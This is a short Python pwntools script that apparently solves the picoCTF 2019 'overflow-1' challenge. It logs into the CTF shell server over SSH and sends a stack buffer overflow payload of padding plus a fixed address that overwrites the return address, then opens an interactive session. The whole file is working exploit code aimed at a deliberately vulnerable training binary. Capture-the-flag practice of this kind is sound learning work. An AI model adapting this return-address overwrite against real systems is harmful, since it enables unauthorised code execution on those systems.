from pwn import *

# Config
LOCAL = False
WRITE = False

# Setup
context.log_level = 'debug'
prob_dir = '/problems/overflow-1_2_305519bf80dcdebd46c8950854760999/'
exe = 'vuln'
if LOCAL:
    sh = process('./' + exe)
else:
    s = ssh(host='2019shell1.picoctf.com', user='thomasvn', password='XXX')
    sh = s.process(prob_dir + exe, cwd=prob_dir)

# Build exploit
cmd = b'A' * 64  # buffer
cmd += b'B' * 4  # data -> .rodata:aFlagFileIsMiss+54
cmd += b'C' * 4  # data -> .got.plt:_GLOBAL_OFFSET_TABLE_
cmd += b'D' * 4  # data -> [stack]:FFC6C628
cmd += p32(0x080485e6)  # overwrite return

# Buffer overflow
sh.sendlineafter('\n', cmd)
sh.interactive()

# Write exploit to file
if WRITE:
    f = open('input.txt', 'wb')
    f.write(cmd)
    f.close()
